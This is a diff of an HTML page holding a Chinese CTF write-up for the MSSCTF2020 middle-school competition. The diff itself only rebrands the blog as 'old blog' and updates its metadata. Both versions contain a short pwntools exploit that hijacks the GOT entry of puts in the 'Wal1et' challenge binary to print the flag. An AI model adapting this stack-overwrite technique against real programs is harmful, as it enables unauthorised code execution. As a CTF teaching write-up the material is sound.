@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 4.2.0">
+<meta name="generator" content="Hexo 6.3.0">
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
   <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
   <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
@@ -24,7 +24,7 @@
 <meta property="og:type" content="article">
 <meta property="og:title" content="【CTF题解-0x05】MSSCTF2020-write-up-by-arttnba3">
 <meta property="og:url" content="http://archive.next.arttnba3.cn/2020/09/19/%E3%80%90CTF%E9%A2%98%E8%A7%A3-0x05%E3%80%91MSSCTF2020-write-up-by-arttnb3-md/index.html">
-<meta property="og:site_name" content="arttnba3&#39;s blog">
+<meta property="og:site_name" content="arttnba3&#39;s old blog">
 <meta property="og:description" content="0x00.绪论MSSCTF即全国中学生网络安全竞赛，是由西安电子科技大学举办的、面向全国中学生的信息安全竞赛，比赛为采用线上解题模式（Jeopardy）的CTF 由于今年疫情原因，比赛全程在线上开办，一心想为学校做贡献（只是想蹭饭）的我也作为志愿者参与了比赛监考的全过程（本来想出题的，但是和中学生巨犇比起来我还是太菜le 以下是我自己的赛后复盘  注：所有的题目环境都已在archive.lctf.">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://i.loli.net/2020/09/20/WCOR8bqNkMHhjf4.png">
@@ -56,7 +56,7 @@
   };
 </script>
 
-  <title>【CTF题解-0x05】MSSCTF2020-write-up-by-arttnba3 | arttnba3's blog</title>
+  <title>【CTF题解-0x05】MSSCTF2020-write-up-by-arttnba3 | arttnba3's old blog</title>
   
 
 
@@ -87,7 +87,7 @@
   </style>
 </noscript>
 
-<link rel="alternate" href="/atom.xml" title="arttnba3's blog" type="application/atom+xml">
+<link rel="alternate" href="/atom.xml" title="arttnba3's old blog" type="application/atom+xml">
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage">
@@ -108,10 +108,10 @@
 
     <a href="/" class="brand" rel="start">
       <span class="logo-line-before"><i></i></span>
-      <h1 class="site-title">arttnba3's blog</h1>
+      <h1 class="site-title">arttnba3's old blog</h1>
       <span class="logo-line-after"><i></i></span>
     </a>
-      <p class="site-subtitle" itemprop="description">- arttnba3的隐秘小窝 -</p>
+      <p class="site-subtitle" itemprop="description">- arttnba3的垃圾堆积处 -</p>
   </div>
 
   <div class="site-nav-right">
@@ -185,11 +185,11 @@
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.png">
       <meta itemprop="name" content="arttnba3">
-      <meta itemprop="description" content="- 做了关于你的梦，所以不愿醒来呢 -">
+      <meta itemprop="description" content="此页面已废弃，新博客: arttnba3.cn">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="arttnba3's blog">
+      <meta itemprop="name" content="arttnba3's old blog">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
@@ -244,10 +244,10 @@
 <p>由于今年疫情原因，比赛全程在线上开办，一心想为学校做贡献（<del>只是想蹭饭</del>）的我也作为志愿者参与了比赛监考的全过程（<del>本来想出题的，但是和中学生巨犇比起来我还是太菜le</del></p>
 <p>以下是我自己的赛后复盘</p>
 <blockquote>
-<p>注：所有的题目环境都已在<a href="https://archive.lctf.online" target="_blank" rel="noopener">archive.lctf.online</a>上有一份</p>
+<p>注：所有的题目环境都已在<a target="_blank" rel="noopener" href="https://archive.lctf.online/">archive.lctf.online</a>上有一份</p>
 <p>以及这次mssctf只有一个人做出pwn题，而且还是ak……中学生恐怖如斯……</p>
 </blockquote>
-<a id="more"></a>
+<span id="more"></span>
 
 <h1 id="0x01-Pwn"><a href="#0x01-Pwn" class="headerlink" title="0x01.Pwn"></a>0x01.Pwn</h1><h2 id="0x00-Wal1et-got表劫持"><a href="#0x00-Wal1et-got表劫持" class="headerlink" title="0x00.Wal1et - got表劫持"></a>0x00.Wal1et - got表劫持</h2><p><a href="/download/mssctf2020/wallet/Wal1et" title="点击此处下载原题">点击下载-Wal1et</a> </p>
 <p>惯例的<code>checksec</code>，发现开了NX保护和canary</p>
@@ -263,7 +263,7 @@
 <p>两次调用<code>scanf()</code>前分别将<code>v1</code>、<code>v2</code>压入栈中，即本质上是<code>scanf(&quot;%d&quot;,v1)</code>与<code>scanf(&quot;%d&quot;,v2)</code>，这里将<code>v1</code>与<code>v2</code>都当成了一个地址并尝试向上面写入数据</p>
 <p>前面我们观察到这两个函数<strong>复用同一个栈空间</strong>，同时在<code>begin()</code>中所读取的字节数量足够覆写<code>check()</code>中的<code>v1</code>，故考虑将v1覆写为后面会调用到的某函数的got表地址，在第一次读入时读入一个可以获得flag的地址，这样会覆写掉got表中原函数的地址；当后面运行到那个函数时，程序会跳转到我们所输入的那个地址上，输出flag，即<strong>got表劫持</strong></p>
 <p>故构造exp如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">'./Wal1et'</span>)</span><br><span class="line">puts_got = e.got[<span class="string">'puts'</span>]</span><br><span class="line">call_sys = <span class="number">0x08048730</span></span><br><span class="line">payload1 = <span class="string">b'a'</span>*<span class="number">104</span>+p32(puts_got)</span><br><span class="line">payload2 = str(call_sys).encode()</span><br><span class="line"></span><br><span class="line">p =process(<span class="string">'./Wal1et'</span>)<span class="comment">#remote('pwn.challenge.lctf.online',10008)</span></span><br><span class="line">p.sendline(<span class="string">b'1'</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./Wal1et&#x27;</span>)</span><br><span class="line">puts_got = e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">call_sys = <span class="number">0x08048730</span></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">104</span>+p32(puts_got)</span><br><span class="line">payload2 = <span class="built_in">str</span>(call_sys).encode()</span><br><span class="line"></span><br><span class="line">p =process(<span class="string">&#x27;./Wal1et&#x27;</span>)<span class="comment">#remote(&#x27;pwn.challenge.lctf.online&#x27;,10008)</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 <p>运行脚本即可获得flag</p>
 <p><img src="https://i.loli.net/2020/09/20/CnhPq8QiNGkZH4e.png" alt="image.png"></p>
@@ -389,7 +389,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00-绪论"><span class="nav-number">1.</span> <span class="nav-text">0x00.绪论</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-Pwn"><span class="nav-number">2.</span> <span class="nav-text">0x01.Pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-Wal1et-got表劫持"><span class="nav-number">2.1.</span> <span class="nav-text">0x00.Wal1et - got表劫持</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-fishing-master"><span class="nav-number">2.2.</span> <span class="nav-text">0x01.fishing master</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00-%E7%BB%AA%E8%AE%BA"><span class="nav-number">1.</span> <span class="nav-text">0x00.绪论</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-Pwn"><span class="nav-number">2.</span> <span class="nav-text">0x01.Pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-Wal1et-got%E8%A1%A8%E5%8A%AB%E6%8C%81"><span class="nav-number">2.1.</span> <span class="nav-text">0x00.Wal1et - got表劫持</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-fishing-master"><span class="nav-number">2.2.</span> <span class="nav-text">0x01.fishing master</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -398,14 +398,14 @@
     <img class="site-author-image" itemprop="image" alt="arttnba3"
       src="/images/avatar.png">
   <p class="site-author-name" itemprop="name">arttnba3</p>
-  <div class="site-description" itemprop="description">- 做了关于你的梦，所以不愿醒来呢 -</div>
+  <div class="site-description" itemprop="description">此页面已废弃，新博客: arttnba3.cn</div>
 </div>
 <div class="site-state-wrap motion-element">
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">25</span>
+          <span class="site-state-item-count">26</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -490,7 +490,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2021</span>
+  <span itemprop="copyrightYear">2023</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
